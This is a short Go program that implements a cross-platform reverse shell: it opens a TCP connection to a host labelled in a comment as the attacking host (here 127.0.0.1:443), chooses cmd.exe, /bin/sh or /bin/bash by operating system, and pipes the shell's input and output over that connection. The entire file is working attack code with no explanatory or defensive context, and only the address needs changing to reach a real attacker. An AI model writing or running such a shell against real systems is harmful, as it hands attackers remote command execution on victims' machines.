package main

import (
	"net"
	"os/exec"
	"runtime"
)

func main() {
	// Establish connection to attacking host
	conn, err := net.Dial("tcp", "127.0.0.1:443")
	if err != nil {
		panic(err)
	}

	// Determine which shell to use
	var shell string
	switch runtime.GOOS {
	case "windows":
		shell = "cmd.exe"
	case "linux":
		shell = "/bin/sh"
	case "darwin":
		shell = "/bin/bash"
	}

	// Run shell command, pointing file descriptors to remote connection
	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
